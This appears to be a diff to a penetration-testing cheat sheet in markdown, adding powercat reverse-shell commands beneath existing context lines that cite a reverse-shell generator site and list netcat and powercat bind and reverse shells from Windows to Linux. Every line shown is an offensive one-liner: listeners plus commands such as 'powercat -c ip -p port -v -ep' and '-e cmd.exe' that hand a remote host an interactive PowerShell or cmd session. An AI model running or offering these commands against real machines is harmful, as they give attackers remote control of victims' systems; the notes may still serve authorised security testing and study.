@@ -9,3 +9,6 @@ https://www.revshells.com/
 ### Windows to Linux
 * powercat -l -p 1080 -e cmd.exe -v (need to download from own server), nc ip port -vv
 * nc -l -p port -vv, powercat -c ip -p port -v -e cmd.exe
+##### powercat return with powershell
+* powercat -l -p port -v
+* powercat -c ip -p port -v -ep
